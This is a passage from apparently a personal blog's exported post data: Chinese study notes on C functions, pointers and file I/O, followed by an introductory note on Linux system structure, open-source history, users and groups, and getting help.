、为什么要定义\n程序中用到的所有函数必须“先定义，后使用”\n\n同变量定义的道理类似，需要事先告知系统该函数功能、参数等信息，具体包括：\n\n函数的名字，一遍按名调用函数的类型，即函数返回值的类型函数的参数名字即类型，以便调用函数时像他们传递数据函数完成什么操作，即功能\n\n\n\n2、定义函数的方法note blue no-icon定义无参函数endnote\n类型名 函数名()             //()内可以加void，可不加&#123;      函数体&#125;例：void pr()&#123;      ptintf(&quot;hello world!&quot;);&#125;\n\nnote blue no-icon定义有参函数endnote\n类型名 函数名(形参列表)&#123;      函数体&#125;例：int max(int a,int b)&#123;      return(a&gt;b?a:b);&#125;\n\nnote blue no-icon定义空函数endnote\n类型名 函数名()&#123;&#125;例：void fun()&#123;&#125;\n\n调用函数一般形式：函数名(实参表列）\n1、调用函数的形式函数调用语句例：pr();函数表达式              //函数调用语句出现在另一个表达式中例：c=2*max(a,b);         //调用函数带回一个确定值并参加表达式的运算函数参数                          //函数调用作为另一个函数调用时的参数例：m=max(a,max(b,c));         //将调用max函数的结果再重新作为下一次调用max函数的参数\n\n2、函数调用时的数据传递在调用有参函数时，系统会把实参的值传传给被调用函数的形参，该值在函数调用期间有效。\n1.形参：定义函数时，函数名括号后面的变量称为形式参数（或虚拟参数）\n\n形参在函数调用时被分配内存单元，调用结束后立即释放\n形参为变量时，实参与形参的数据传递是“值传递”，即“单向传递”。\n\n2.实参：在主调函数中调用一个函数时，函数名后面括号中的参数称为实际参数\n\n实参可以是常量、变量或表达式，但要求有确定值。\n应保证形参与实参个数、类型、顺序的一致（字符型与整型可通用）。\n形参与实参的类型应相同或i赋值兼容。\n\nnote red modern注：实参向形参的数据传递是“值传递”，单向传递，只能由实参传给形参，而不能由形参传给实参。实参和形参在内存中占有不同的存储单元，实参无法得到形参的值。endnote\n3、函数的返回值调函数调用函数希望得到一个确定值，这就是函数的返回值\n\n函数的返回值是通过return语句获得的\n\n可以有多个return语句，但只能有一个起作用。即函数只能返回一个值\n\n函数返回值的类型取决于定义函数时指定的函数值的类型\nint max(int x,int y)             //函数值为整型double min(int x,int..y)         //函数值为double类型\n\n在定义函数时指定的函数类型一般应该和return语句中的表达式一致，若不一致，则以函数类型为准，即函数类型决定返回值类型。\n\n对于不带返回值的函数，应当定义为void类型。\n\n\n小结\n\n函数——即想要实现某一功能所编写的程序，可将其理解为一个黑匣子，给它相应的输入（由调用者决定），它经过加工操作，给出你一个输出（结果）。\n\n函数的定义可理解为该制作该黑匣子，需要包括以下信息：\n\n需要明确告知该函数的名字（一般以黑匣子的功能简称作为名字，做到见名知意）使用该函数需要提供的输入（包括明确规定需要提供几个输入以及每个输入的类型）该函数能够实现什么功能（黑匣子的详细功能介绍）函数类型，也称函数返回值类型（即执行完毕后会输出什么）\n\n该输出值由return语句带回。若不用带回值，则不用写return语句，同时函数定义为void类型返回值类型应与函数类型一致，若不一致，则以函数类型为准。\n\n\n\n函数调用：使用该黑匣子的过程，若需要提供输入，则涉及到形参和实参之间的数据传递\n\n\n对被调用函数的声明和函数原型1、调用函数时应该具备的条件\n\n被调用函数必须是已经定义的函数\n若该被调用函数为库函数，则需要在文件开头，用#include指令调用\n若该被调用函数为用户自己定义的函数，而该函数的位置在调用它的函数的后面，则需要在主调函数中对被调函数做声明。\n声明是为了提前将该函数的相关信息告知编译系统，以允许编译系统检查调用是否合法。\n\n\n\n2、函数声明的形式(2种)\n\n1.函数类型函数名(参数类型1参数名1,参数类型2c参数名2,……参数类型n参数名n);\n2.函数类型函数名(参数类型1,参数类型2,……参数类型n)\n\n函数的嵌套调用在调用一个函数的过程中，又调用另一个函数\n#include&lt;stdio.h&gt;int fun2(int m)&#123;    return m*m;&#125;int fun1(int x,int y)&#123;    return fun2(x) + fun2(y);&#125;int main()&#123;    int a,b;    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);    printf(&quot;%d&quot;,fun1(a,b));    return0;&#125;\n\n函数的递归调用在调用一个函数的过程中又直接或间接地调用该函数本身\n#include&lt;stdio.h&gt;unsigned fac(int n)&#123;    unsigned f;    if (n==0)        f = 1;    else        f = fac(n-1)*n;    return f;&#125;int main()&#123;    unsigned n,y;    scanf(&quot;%d&quot;,&amp;n);    y = fac(n);    printf(&quot;%d!=%d\\n&quot;,n,y);    return0;&#125;\n\n数组作为函数参数(数组元素和数组名)\n调用有参函数时，需要提供实参。\n实参可以是常量、变量、表达式。\n数组元素和数组名也可以作为函数的实参。\n\n1、数组元素作为函数参数\n与变量作用相当，凡是变量可以出现的地方，都可以用数组元素代替。\n\n数组元素只可以作为函数的实参，不可以用作形参。\n\n因为形参是在函数被调用时临时分配存储单元的，不可能为一个数组元素单独分配存储单元。\n\n而实参的传递是单向值传递。\n//已知10个三角形的三边长,求它们的面积。#include&lt;math.h&gt;#include&lt;stdio.h&gt;float area(float a,float b,float c)&#123;    float p,s;    p = (a+b+c)/2;    s = sqrt(p*(p-a)*(p-b)*(p-c));    return(s);&#125;int main()&#123;    floata[10],b[10],c[10],s[10];    int i;    for(i=0;i&lt;10;i++)    &#123;        scanf(&quot;%f%f%f&quot;,&amp;a[i],&amp;b[i],&amp;c[i]);        s[i]=area(a[i],b[i],c[i]);        printf(&quot;s[%d]=%f\\n&quot;,i+1,s[i]);    &#125;    return0;&#125;\n\n\n\n2、数组名作为函数参数1、一维数组名作为函数参数\n数组名既可以作形参，也可以作实参。\n\n数组名表示的是数组第一个元素的地址\n\n形参数组可以不指定大小，但在定义数组时，需要在数组名后加上一个空的方括号\nfloat average(float array[])          //定义average函数，形参数组不指定大小\n\n由于用数组名作函数实参时，不是把数组元素的值传给形参，而是把实参数组的首元素地址传递给形参数组，因此这两个数组共用一段内存单元。即形参数组中各元素的值如果发生了变化，会使实参数组元素的值同时发生变化。\n\n\n//形参和实参共享一段内存单元#include &lt;stdio.h&gt;void fun(int b[])&#123;    int i;    for (i=0;i&lt;=4;i++)    &#123;        b[i] = 100;    &#125;&#125;int main()&#123;    int a[5] = &#123;0&#125;;    int i;    fun(a);    for (i=0;i&lt;=4;i++)    &#123;        printf(&quot;%d&quot;,a[i]);    &#125;    return0;&#125;\n\n2、多维数组名作函数参数\n多维数组元素可以作为函数参数，在被调用函数中，对形参数组定义时，可以指定每一维大小，也可省略第一维大小。\n//一下两种均合法int array[3][10];int array[][10];\n\n但不能将2为或更高维的大小省略\n//错误示范int array[][]int array[3][]\n\n第二维大小相同的前提下，形参数组第一维可以与实参数组不同\n实参数组定义：int score[5][10];形参数组定义：int array[][10];  或  int array[8][10];\n\n局部变量和全局变量\n量必须先定义，后使用\n在一个函数中定义的变量，在其他函数中能否被引用？&#x3D;&#x3D;&#x3D;&#x3D;》作用域\n在函数内定义的变量是局部变量，在函数外定义的变量是外部变量，外部变量是全局变量\n\n1、定义变量的三种情况\n在函数开头定义（作用范围：从定义处开始至本函数结束）局部变量\n在函数内的复合语句内定义（作用范围：本复合语句范围内）局部变量\n\n#include &lt;stdio.h&gt;int main()&#123;    int a=1,b=2;    &#123;        int c;        c = a+b;        printf(&quot;%d&quot;,c);              //可以输出    &#125;                          \t\t   //c的作用范围仅限于该复合语句块内    printf(&quot;%d&quot;,c);                 //会报错，显示c未被定义    return0;&#125;\n\n\n在函数的外部定义（作用范围：从定义变量的位置开始到本源文件结束）外部变量\n\n2、其他注意事项\n在一个函数中既可以使用本函数中的局部变量，也可以使用有效的全局变量\n设置全局变量可以增加函数间数据联系的渠道，但也因此如果在一个函数中改变了全局变量的值，\n就会影响到其他函数全局变量的值。\n因函数调用只能带回一个函数返回值，因此有时可以利用全局变量得到一个以上的值。\n不成文的规定：将全局变量首字母大写\n非必要不使用全局变量\n长时间占用存储空间\n函数通用性降低\n增加了耦合性（各函数之间关联变多）\n移植性差\n\n\n降低了清晰性\n\n\n若在同一个源文件中，全局变量和局部变量同名，在局部变量的作用范围内，全局变量会被屏蔽。\n\n变量的存储方式和生存期\n从变量值的存在时间（生存期）来看，变量的存储可以分为静态存储方式和动态存储方式。\n静态存储方式：程序运行期间由系统分配固定的存储空间（全局变量全部存放在静态存储区中）\n动态存储方式：程序运行期间，根据需要动态的分配存储空间。（函数形参，自动变量，函数调用时的现场保护和返回地址）\n\n\n\n1、局部变量的存储类别1、自动变量（auto）\n特点：在调用该函数时，系统会给这些变量分配存储空间，在函数调用结束时就自动释放这些存储空间\n\n函数中的形参和在函数中定义的局部变量都属于自动变量\n\n不写auto则隐含指定为自动存储类别\nint fac(int a)&#123;    auto int b,c=3;             //与intb,c=3;完全等价    .....&#125;\n\n\n\n2、静态局部变量（static）\n特点：函数中局部变量的值在函数调用结束后不消失而继续保留原值，在下一次调用该函数时，该变量已有值。\n\n3、寄存器变量（register）\n对于一些频繁使用的变量，可将其存储在具有高速存取速率的寄存器中，这种变量叫寄存器变量\nregister int f;\n\n目前已不需要，遇到能看懂即可。\n\n\n全局变量的存储类别1、在一个文件内扩展外部变量的作用域(extern关键字)2、将外部变量的作用域扩展到其他文件(extern关键字)3、将外部变量的作用域限制在本文件中(定义变量时加上static声明)\n\n对局部变量用static声明，把它分配在静态存储区，该变量在整个程序执行期间不释放，其所分配的空间始终存在。*对全局变量用static声明，则该变量的唑酮与只限于本文件模块（即被声明的文件中）。\n\n关于变量的声明和定义1、对于函数而言\n函数的声明时函数的原型，函数的定义是对函数功能的定义。\n\n2、对变量而言*建立存储空间的声明称为定义，不建立存储空间的声明称为声明。\n内部函数和外部函数\n根据函数能否被其他源文件调用，将函数区分为内部函数和外部函数\n\n1、内部函数（静态函数）如果一个函数只能被本文件中其他函数所调用，则称为内部函数。定义内部函数时，在函数名和函数类型的前面加static，即\nstatic 类型名 函数名(形参名）\n\n2、外部函数如果在定义函数时，在函数首部的左端加关键字extern，则此函数时外部函数，可供其他文件调用\nextern int fun(int a,int b)\n\n若在定义时省略extern，则默认为外部函数\n","categories":["笔记"],"tags":["C语言","笔记"]},{"title":"C语言-4","url":"/2022/12/01/c_learn_4/","content":"指针1、了解数据在内存中如何存取\n定义变量后，系统会为该变量分配内存单元。\nint i=5; //编译系统根据所定义变量类型（int）分配4个字节的存储空间供使用，且该存储空间的名字为i，内部存储数据为5；\n\n内存中每一个字节都有一个编号——》地址\n\n根据地址能定位至内存中的某一确定位置\n\n\n使用地址和变量名均可访问到数据（即对内存中数据的访问有两种形式：直接访问和间接访问）\n\n直接访问：按变量名存取变量值（知道房间名，直接看门牌去）\n间接访问：通过存放变量地址的变量去访问变量。（不知道房间名，也不知道地址，询问服务人员得知在2楼第1间，进入房间）\n\n\n\n举例：\n2、什么是指针\n指针：地址\n指针变量：专门用来存放另一变量的地址（指针）的变量。\n区分指针和指针变量\n指针变量中存放指针\n指针是一个具体的地址\n\n\n\n\n\n指针变量1、定义指针变量\n定义指针的一般形式\n类型名 *指针变量名int *p;                 //定义一个指针变量p，规定其可以指向整型变量。\n\n注意事项：note red modern指针变量前面的”*”表示该变量为指针型变量，指针变量名是p，而不是 *p。\n在定义指针变量时必须指定基类型（因为不同类型的数据在内存中所占的字节数和存放方式是不同的）指向整形数据的指针类型表示为“int*”，读作指向int的指针，或 int指针\n指针变量中只能存放地址（指针），试图将一个整数赋给一个指针变量是不合法的。\nendnote\n2、引用指针变量\n给指针变量赋值\np = &amp;a;                 //把a的地址赋给指针变量p；\n\n引用指针变量指向的变量\np = &amp;a;printf(&quot;%d&quot;,*p); //输出p所指向的变量的值，即a的值，*p的使用与a相同\n\n引用指针变量的值\nprintf(&quot;%o&quot;,p); //以八进制输出指针变量p的值，p指向a，则输出a的地址\n\n强调两个运算符。\n\n\n\n“&amp;”取地址运算符 &amp;a是变量a的地址“*” 指针运算符（间接访问运算符） *p代表指针变量p指向的对象\n\n例：\n#include &lt;stdio.h&gt;int main()&#123;    int a=50 , *p ;    p=&amp;a ;    *p=100;    printf(&quot;%d, %d, %o\\n&quot;, a, *p, p);               //100, 100, 30577024    printf(&quot;%o, %o\\n&quot;,&amp;*p, &amp;a);              //30577024, 30577024    printf(&quot;%d, %d\\n&quot;,*&amp;a, *p);                 //100, 100    return 0;&#125;\n\n3、指针变量作为函数参数以输入a和b两个整数，按大小顺序输出为例\n#include&lt;stdio.h&gt;int main()&#123;     int *p1, *p2, *p, a, b;    scanf(&quot;%d, %d&quot;, &amp;a, &amp;b);    p1=&amp;a; p2=&amp;b;    if ( a&lt;b )     &#123;        p=p1; p1=p2; p2=p;     &#125;    printf(&quot;a=%d, b=%d\\n&quot;, a, b);    printf(&quot;max=%d, min=%d\\n&quot;, *p1, *p2);    return 0;&#125;//a=5 , b=7//max=7 , min=5void swap(int x, int y)&#123;    int t;    t=x; x=y; y=t;&#125;#include&lt;stdio.h&gt;int main( )&#123;     int a, b;    scanf(&quot;%d,%d&quot;,&amp;a,&amp;b);    if ( a&lt;b )         swap(a, b);    printf(&quot;%d,%d\\n&quot;, a,b);    return 0;&#125;//5,7void swap(int *p1, int *p2)&#123;    int *p;    p=p1; p1=p2; p2=p; &#125;#include&lt;stdio.h&gt;int main( )&#123;     int a, b, *pa, *pb;    scanf(&quot;%d, %d&quot;, &amp;a, &amp;b);    pa=&amp;a; pb=&amp;b;    if ( a&lt;b )         swap(pa, pb);    printf(&quot;%d,%d\\n&quot;,*pa,*pb);    return 0;&#125;//5, 7void swap(int *p1, int *p2)&#123;     int *p; //加上int c; p=&amp;c; 即可成功    *p=*p1; *p1=*p2; *p2=*p;&#125;#include&lt;stdio.h&gt;int main( )&#123;     int a, b, *pa, *pb;    scanf(&quot;%d, %d&quot;, &amp;a, &amp;b);    pa=&amp;a; pb=&amp;b;    if ( a&lt;b )         swap(pa, pb);    printf(&quot;%d, %d\\n&quot;, a, b);    return 0;&#125;//Run-Time Check Failure #3 - The variable &#x27;p&#x27; is being used without being initialized.void swap(int *p1, int *p2)&#123;     int p;    p=*p1; *p1=*p2; *p2=p; &#125;#include&lt;stdio.h&gt;int main( )&#123;     int a, b, *pa =&amp;a, *pb =&amp;b;    scanf(&quot;%d, %d&quot;, pa, pb);    if ( a&lt;b )         swap(pa, pb);    printf(&quot;%d, %d\\n&quot;, a, b);    return 0;&#125;//7, 5\n\n\n函数调用不能改变实参指针变量的值，但可以改变其所指向的变量的值。\n主调函数和被调函数之间数值传递的方式\n实参—-&gt;形参的数据传递；return语句。\n全局变量。\n形参为指针。\n函数参数（形参或实参）为数组名或指针\n\n\n\nvoid fun(int a,int b,int *c,int *d)&#123; *c=a+b ; *d=a-b ; &#125;#include&lt;stdio.h&gt;int main( )&#123;     int x , y , z , w ;    scanf(&quot;%d,%d&quot;,&amp;x , &amp;y ) ;    fun( x , y, &amp;z , &amp;w ) ;    printf(&quot;%d,%d\\n&quot; , z , w ) ;    return 0;&#125;\n\n通过指针引用数组\n关于数组\nint a[5];                           //定义一个长度为5的整型数组，内含5个数组元素：a[0],a[1],a[2],a[3],a[4]                                        //对于数组元素的引用与普通变量相同                                      //数组名a代表数组中首个元素的地址，即a[0]的地址\n\n更多关于数组\n点此跳转\n\n\n1、数组元素的指针\n指针变量既然可以指向变量，自然也可以指向数组元素。\ninta[5]=&#123;1,2,3,4,5&#125;;//定义a为包含5个整型数据的数组\n\nint*p;               //定义p为指向整型变量的指针变量p=&amp;a[0];         //把a[0]元素的地址赋给指针变量\n\n等价于\nint*p=&amp;a[0];//定义时直接进行初始化\n\n等价于\nint*p=a;//因为数组名a代表的就是&amp;a[0]\n\n2、在引用数组元素时的指针运算运算：数据的加减乘除指针是内存地址编号，运算的意义？一定条件下，允许对指针进行加减运算。该条件指：指针指向数组元素。\n\n如果指针变量p已指向数组中的某个元素*p+1指向数组中该元素的下一个元素&#x2F;&#x2F;指针运算中加减的数值是默认乘以（该数据类型所占内存字节数）之后参与运算的\n\np-1指向数组中该元素的上一个元素\n\np++,++p,p–,–p,+&#x3D;,-&#x3D;均是合法运算\n\n的初值未&amp;a[0]，则p+i和a+i就是数组元素a[i]的地址。\n\n(p+i)或(a+i)就是p+i或a+i所指向的数组元素\n\n若指针p和q均指向同一数组中的元素，则执行p-q，所得结果表示两者所指元素中间的差值个数。*p+q无意义。\n#include&lt;stdio.h&gt;int main()&#123;    int a[3]=&#123;100,200,300&#125;;    int *p=a;                //等价于int*p=&amp;a[0];    int *q=&amp;a[1];    printf(&quot;%d&quot;,*p);                   //100    printf(&quot;%d&quot;,*(p+2));             //300    printf(&quot;%d&quot;,*(q-1));              //100    printf(&quot;%d&quot;,*(a+2));             //300    printf(&quot;%d&quot;,q-p);                 //1    return 0;&#125;\n\n\n\n3、通过指针引用数组元素\n引用一个数组元素，可以用下面两种方法：\n下标法a[i]\n指针法*(a+i)或*(p+i)&#x2F;&#x2F;a是数组名，p是指向数组中首元素的指针变量。查看课本P231页例8.6\n\n\n\nnote red modern注意：\n\n可以通过改变指针变量的值指向不同的元素例p++，但需注意不能通过数组名a变化的方法，因为数组名a为一个指针型常量。\n使用指针变量时，需要注意指针变量的当前值。\n\nendnote\n4、用数组名做函数参数\n就第七章所学，当用数组名做参数时，形参数组中各元素值发生改变，实参数组元素值随之变化作解释\n\n实参数组名代表该数组首元素地址\n\n形参用来接收从实参传递过来的数组首元素地址。\n\n因此，形参是一个指针变量（因为只有指针变量才能存放地址）\n\n实际上，C编译将形参数组名作为指针变量来处理。\nfun(int arr[],int n);        //等效于fun(int *arr,int n);\n\n实参数组名代表一个固定的地址，或者说是指针常量，但形参数组名并不是一个固定的地址，而是按指针变量处理。因此在函数执行期间，它可以再被赋值。\n\n\n若有一个实参数组，要想在函数中改变此数组中元素的值，实参与形参对应关系有以下四种情况：\n\n形参和实参都用数组名\n#include&lt;stdio.h&gt;void fun(int b[])&#123;    int i;    for(i=0;i&lt;=4;i++)    &#123;        b[i]=100;    &#125;&#125;int main()&#123;    int a[5]=&#123;0&#125;;    int i;    fun(a);    for(i=0;i&lt;=4;i++)    &#123;        printf(&quot;%d&quot;,a[i]);    &#125;    return 0;&#125;\n\n实参用数组名，形参用指针变量\n#include&lt;stdio.h&gt;void fun(int*b)&#123;    int i;    for(i=0;i&lt;=4;i++)    &#123;        *(b+i)=100;    &#125;&#125;int main()&#123;    int a[5]=&#123;0&#125;;    int i;    fun(a);    for(i=0;i&lt;=4;i++)    &#123;         printf(&quot;%d&quot;,a[i]);    &#125;    return 0;&#125;\n\n实参形参都用指针变量\n#include&lt;stdio.h&gt;void fun(int*b)&#123;    int i;    for(i=0;i&lt;=4;i++)    &#123;        *(b+i)=100;    &#125;&#125;int main()&#123;    int a[5]=&#123;0&#125;;    int i;    int *p;    p=a;    fun(p);    for(i=0;i&lt;=4;i++)    &#123;        printf(&quot;%d&quot;,a[i]);    &#125;    return 0;&#125;\n\n实参为指针变量，形参为数组名\n#include&lt;stdio.h&gt;void fun(int b[])&#123;    int i;    for(i=0;i&lt;=4;i++)    &#123;       b[i]=100;    &#125;&#125;int main()&#123;    int a[5]=&#123;0&#125;;    int i;    int *p;    p=a;    fun(p);    for(i=0;i&lt;=4;i++)    &#123;        printf(&quot;%d&quot;,a[i]);    &#125;    return 0;&#125;\n\n通过指针引用字符串1、引用字符串的两种方法：\n字符数组内存放字符串，用数组名和%s输出\n用字符指针变量指向一个字符串常量，通过字符指针变量引用字符串常量。\n\n2、字符指针作函数参数实参与形参对应关系有以下四种情况\n\n形参和实参都用字符数组名\n实参用数组名，形参用字符指针变量\n实参形参都用指针变量\n实参为指针变量，形参为字符数组名\n\n","categories":["笔记"],"tags":["C语言","笔记"]},{"title":"C语言-5","url":"/2022/12/20/c_learn_5/","content":"打开与关闭文件1、用fopen打开文件\nfopen(文件名，使用文件方式)\nfopen(&quot;D:\\\\date\\\\Mystudio\\\\demo.txt&quot;,&quot;r+&quot;);fopen(&quot;D:/date/Mystudio/demo.txt&quot;,&quot;r+&quot;);\t\t//绝对路径\n\nfopen函数的返回值是只要操作文件(demo.txt)的指针，若出错，将返回一个空指针(NULL)。\n\n因此，一般是将fopen函数返回值赋给一个指向文件的指针变量。\nFILE *fp;\t\t//定义一个文件指针//打开一个文件，&quot;r+&quot;表示可读可写的模式打开fp = fopen(&quot;D\\\\date\\\\Mystudio\\\\demo.txt&quot;,&quot;r+&quot;);if(fp==NULL)\tprintf(&quot;文件demo打开失败&quot;);else\tprintf(&quot;文件demo打开成功&quot;);fclose(fp);\t\t//关闭文件\n\n2、用fclose关闭文件\nfclose(文件指针);\nfclose(fp);\n\n如不关闭文件就结束程序可能会丢失数据。\n\nfclose函数也会返回一个值，当成功执行了关闭为文件操做，返回值为0，否则返回EOF(-1);\n\n\n顺序读写数据文件向文件读写字符1、fgetc(fp) 从fp指向的文件读入一个字符\n读成功则返回所读的字符，失败则返回u文件结束标志EOF(-1);\nchar c=fgetc(fc);\n\n2、fputc(ch.fp); 把字符ch写道文件指针变量fp所指向的文件中\n输出成功，则返回值就是输出的字符，失败就会返回EOF(-1);\n\n3、feof(fp)函数用来判断文件是否结束\n如果遇到文件结束，函数feo(fp)的值为非零值，否则为0\n\nchar c;c = fuputc(ch.fp)while(!feof(fp))&#123;\tprintf(&quot;%c&quot;,c);\tc = fputc(ch,fp);&#125;//输出文件中的所有字符\n\n向文件读写字符串1、fgets(str,n,fp)从fp指向的文件读如一个长度为(n-1)的字符串\n读成功则返回地址str，否则返回NULL;\n\nFILE *fp;char c[15];fp = fopen(&quot;D:/date/Mystudio/demo.txt&quot;,&quot;r+&quot;);fgets(c,15,fp);print(&quot;%s&quot;,c);\n\n2、fputs(str,fp)把str指向的字符串写道文件指针变量fp所指向的文件中\n输出成功则返回 0 ，否则返回非0值\nFILE *fp;char c[15]=&#123;&quot;Hello Linux.&quot;&#125;;fp = fopen(&quot;d/date/Mystdio/demo.txt&quot;,&quot;r+&quot;);fputs(c,fp);\n\n用格式化方式读写文本fprint(文件指针，格式字符串，输出列表)格式化输出字符FILE *fp;fp = fopen(&quot;D;/date/Mystudio/demo.txt&quot;,&quot;r+&quot;);int i =5;float f = 6.5;fprint(fp,&quot;i = %d,f = %6.2f&quot;,i,f);\n\n2、fcanf(文件指针，格式字符串，输出列表)格式化读入字符FILE *fp;fp - fopen(&quot;D:/dete/Mystudio/demo.txt&quot;,&quot;r+&quot;);int i;float f;fscanf(fp,&quot;%d%f&quot;,&amp;i,&amp;f);printf(&quot;%6.2f&quot;,i+f);\n\n用二进制方式向文件读写一组数据1、fwrite(butter,size,count,fp);向文件写数据块\n\n\n名字\n解释\n\n\n\nbutter\n地址\n\n\nsize\n字节数\n\n\ncount\n要写多少数据块\n\n\nfp\nFILE类型指针\n\n\n#include &lt;stdio.h&gt;#include &lt;stdio.h&gt;struct Student&#123;\tchar name[20];\tchar addr[20];&#125;s1[3]=&#123;\t&#123;&quot;lingren&quot;,&quot;Daoqi120&quot;&#125;,\t&#123;&quot;zhongli&quot;,&quot;liyue100&quot;&#125;,\t&#123;&quot;baerzebu&quot;,&quot;Daoqi100&quot;&#125;,&#125;;int main()&#123;\tFILE *fp;\tfp = fopen(&quot;E:/USERS/桌面文件/test.txt&quot;,&quot;r+&quot;);\tint i;\tfor(i=0;i&lt;3;i++)\t\tfwrite(&amp;s1[i],sizeof(struct Student),1,fp);\tfclose(fp);\t    wreturn 0;&#125;\n\n\n2、fread(buffer,size,count,fp); 从文件中读数据块五、随机读写数据文件1、rewind函数 使文件位置标记指向文件开头2、fseek(文件类型指针，位移量，起始点) 改变文件位置标记fseek(fp,0,SEEK_SET);\t\t//光标移动到文件开头后往后偏移0个字节的位置#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct Student&#123;\tchar name[10];\tchar addr[10];&#125;s1[4]=&#123;\t&#123;&quot;lingren&quot;,&quot;Daoqi120&quot;&#125;,\t&#123;&quot;zhongli&quot;,&quot;liyue100&quot;&#125;,\t&#123;&quot;baerzebu&quot;,&quot;Daoqi100&quot;&#125;,&#125;;int main()&#123;\tFILE *fp;\tfp = fopen(&quot;E:/USERS/桌面文件/test.txt&quot;,&quot;r+&quot;);\tint i;\tfor(i=0;i&lt;3;i++)\t\tfwrite(&amp;s1[i],sizeof(struct Student),1,fp);\tfseek(fp,sizeof(struct Student),SEEK_SET);\tfread(&amp;s1[3],sizeof(struct Student),1,fp);\tprintf(&quot;%s,%s&quot;,s1[3].name,s1[3].addr);\tfclose(fp);\treturn 0;&#125;\n\n六、文件读写出错检测1、ferror(fp) 检测是否出错#include&lt;stdio.h&gt;int main(void)&#123;\tFILE* fp;\tfp = fopen(&quot;demo.txt&quot;,&quot;w&quot;);\tfgetc(fp);\tif (ferror(fp))\t&#123;\t\tprintf(&quot;读取出错\\n&quot;);\t\tprintf(&quot;%d\\n&quot;,ferror(fp));\t\tclearerr(fp);\t\tprintf(&quot;%d\\n&quot;,ferror(fp));\t&#125;    fclose(fp);    return 0;&#125;","categories":["笔记"],"tags":["C语言","笔记"]},{"title":"云计算 - Linux用户基础","url":"/2023/03/19/cloud_linux_1/","content":"Linux系统结构操作系统的组成Linux系统一般有四个主要部分:内核,shell,文件系统和应用程序.内核,shell和文件系统一起形成了基本的操作系统结构,他使得用户可以运行程序,管理文件并使用系统.\n内核组成\n系统调用接口\n进程管理\n内存管理\n虚拟文件系统\n网络协议堆栈\n硬件驱动\n安全\n\n\n用户程序\n\nSHELL(CLI)\n图形化(GUI)\n终端界面(TUI)\n各种服务\n\n\nAPI\n大多数程序员从来不知道系统调用的细节,他们设计程序主要根据API(Application Programming Interface)\nAPI定义了一组可供应用程序使用的函数.\n\n\n最常见的 API\nWin32 \nPOSIX API \nJAVA API \n\n系统接口类型\n\n进程控制相关(create peocess,terminate process)\n文件管理相关(create file,delete file,open,close)\n设备管理(request device,release device)\n……\n\n\n系统架构\n虚拟文件系统\n虚拟文件系统(VFS)是物理文件系统与服务之间的一个接口层,他对Linux的每一个文件系统的所有细节进行抽象化,使得不同的文件系统在Linux核心以及系统中运行的其他进程看来,都是相同的.\n\n开源 &amp;&amp; 闭源 &amp;&amp; 共享源\n\n开源(open source)是一种促进自由重新分发和自由访问产品设计理念,想法以及实施细节的理念.\n开源软件被发布给开源社区,而闭源软件是由比较小的开发团队隔离开发的.\n开源相对更加安全,BUG和漏洞解决相对比较快.\n\n开源的例子\n\n开源的应用软件:\nChromium\nMozilla firefox\nOpen office …\n\n\n开源的操作系统:\nAndroid\nLinux\nFreeBSD …\n\n\n开源的编程语言:\nPerl,php,python,ruby,java …\n\n\n\n\n自由软件基金会\nGNU : GNU’s Not Unix\nFSF : Free Software Foundation\nGPL : General Public License\n\n\n\n自由软件\n自由软件,不只是开放源码\n自由软件的敌人是私有软件\n四大自由: 自由使用,修改,复制,发行\n\n\nLicense and copyright\n有几百种不同的license\n有些license去遵守是有点难度的\nGNU GPL说如果被修改,发布的代码也要在GPL下发布,你只能用GPL代码\n“copyleft”(非盈利版权)\n\n\n\n\n自由软件 &amp;&amp; 免费软件\n自由软件不一定免费\n免费软件并不公开源码\n\n\n\n\n共享源(Mixed&#x2F;shared source)\n介于开源和闭源之间\n\nUnix 历史\n\n\n\n第一阶段: 诞生\n\n\n\n第二阶段(1973年~70年代末):免费扩散\n第三阶段(20世纪70年代中期~80年代中期): 商用版本的出现和三大主线的形成\n第四阶段(20世纪80年代后期): 两大阵营和标准化\n第五阶段(20世纪90年代): 面对外来的竞争,阵营淡化\n\nLinux 历史\n\n1984: GNU 工程和自由软件基金会\n创建开源版本的UNIX事业\n创建General Public License\n\n\n\n\n\n软件许可遵循开源规则\n1991: Linux Torvalds\n创建开源类似 unix 内核的代码,并且发布在GPL下\n\n\n\nLinux 发行版\n\nRed Hat \n\n\n\nUbuntu \nDebian \nArch \nKali \ncentos \n\nIsoft\nlinux 终端什么是终端\n终端是一种输入输出设备,用来让用户输入数据,及显示计算结果的设备.相对于计算机而言,其属于外设,本身不提供运算处理能力.\n\n\ntty\n切换\n\n图像化转到 TTY 的方法: CTRL+ALT+Fn(F2~F6)\nTTY之间切换: ALT+Fn(F2~F6)\nTTY切换回图形化界面: ALT+F1\n\nPTS\n用户和组用户和组的含义用户\n\n每个用户被分配一个独特的用户id号(UID)\nUID 0 标识 root 用户\n用户账号通常从UID 500 开始\n\n\n\n\n组\n用户指派给组\n每一个组被分配给一个独特的组ID(gid)\n\n用户和组 ID\n用户名映射到用户ID数字\n组名映射到组ID数字\n储存在硬盘上的数据是数字形式储存的.\n\nRoot用户\n\nroot用户: 一个特定的管理员账号,也被称作超级用户\n\n\n\nroot用户几乎可以完全控制系统,它同样也可完全不受限制的损坏系统\n正常用户损坏系统的可能性是非常小的\n\n系统用户和组\n\n典型的web或者打印服务的服务程序以非特权用户运行,而不是用root用户\n例如: daemon,mail,lp,nobody\n\n\n\n\n\n这种方式运行的程序限制了任何单个程序能够对系统做的危害数量\n\nfolding cyan close, 简单的查看用户信息命令\nuseradd user1       #添加一个 user1 用户passwd user1        #对user1进行设置密码id user1            #查看user1的id信息cat /etc/passwd     #查看所有用户信息su - user1          #以root身份创建一个新的shell\n\nendfolding\n获取帮助执行命令的方法\n\n–help\nman\n\n运行命令\n\n命令有着如下的语法\ncommand options arguments\n\n\n\n\n\n项与项之间以空格隔开\noptions修饰一个命令的行为\n单字母选项一般带有”-“,例如:-a,-b,-c,或者-abc\n全字母选项前常带有”–”,例如:–help\n\n\n参数是一个文件名或者其他被该命令需要的数据\n多个命令用”;”进行分隔\n\n\n\n多种层次的帮助\nwhatis\ncommand -help\nman\ninfo\n&#x2F;usr&#x2F;share&#x2F;doc\n官方网站\nGoogle,baidu\n\n\n\n\nwhatiswhatis是查询一个命令执行什么功能，并把查询结果打印到显示器上。\n\n显示命令的简短描述\n这些描述储存在数据库中,每晚更新(命令 makewhatis)\n在安装完软件后无法马上使用\n\nman命令\n\n为名提供相关帮助文档\n\n\n\n几乎所有的命令都有 man 